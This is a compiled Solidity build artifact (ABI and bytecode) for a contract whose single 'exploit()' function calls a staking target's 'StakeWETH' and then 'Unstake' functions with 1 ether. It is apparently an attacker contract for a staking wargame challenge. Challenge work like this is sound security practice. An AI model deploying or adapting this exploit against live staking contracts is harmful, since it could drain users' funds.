{"abi":[{"type":"constructor","inputs":[{"name":"_stakeInstance","type":"address","internalType":"address payable"}],"stateMutability":"nonpayable"},{"type":"function","name":"exploit","inputs":[],"outputs":[],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x6080604052348015600e575f5ffd5b50604051610373380380610373833981016040819052602b916058565b5f80546001600160a01b039092166001600160a01b03199283168117909155600180549092161790556083565b5f602082840312156067575f5ffd5b81516001600160a01b0381168114607c575f5ffd5b9392505050565b6102e3806100905f395ff3fe608060405234801561000f575f5ffd5b5060043610610029575f3560e01c806363d9b7701461002d575b5f5ffd5b610035610037565b005b5f80546040517f5374616b65574554482875696e74323536290000000000000000000000000000602082015273ffffffffffffffffffffffffffffffffffffffff9091169060320160408051601f19818403018152908290528051602090910120670de0b6b3a764000060248301529060440160408051601f198184030181529181526020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff167fffffffff000000000000000000000000000000000000000000000000000000009094169390931790925290516101159190610281565b5f604051808303815f865af19150503d805f811461014e576040519150601f19603f3d011682016040523d82523d5f602084013e610153565b606091505b5050905080610160575f5ffd5b5f546040517f556e7374616b652875696e743235362900000000000000000000000000000000602082015273ffffffffffffffffffffffffffffffffffffffff9091169060300160408051601f19818403018152908290528051602090910120670de0b6b3a764000060248301529060440160408051601f198184030181529181526020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff167fffffffff0000000000000000000000000000000000000000000000000000000090941693909317909252905161023d9190610281565b5f604051808303815f865af19150503d805f8114610276576040519150601f19603f3d011682016040523d82523d5f602084013e61027b565b606091505b50505050565b5f82515f5b818110156102a05760208186018101518583015201610286565b505f92019182525091905056fea2646970667358221220fef76fa3ac4a6b7110f3aa1f8629a6dbe8e925df8ed227d3a298acb6894c9b5564736f6c634300081c0033","linkReferences":{}},"methodIdentifiers":{"exploit()":"63d9b770"},"id":0}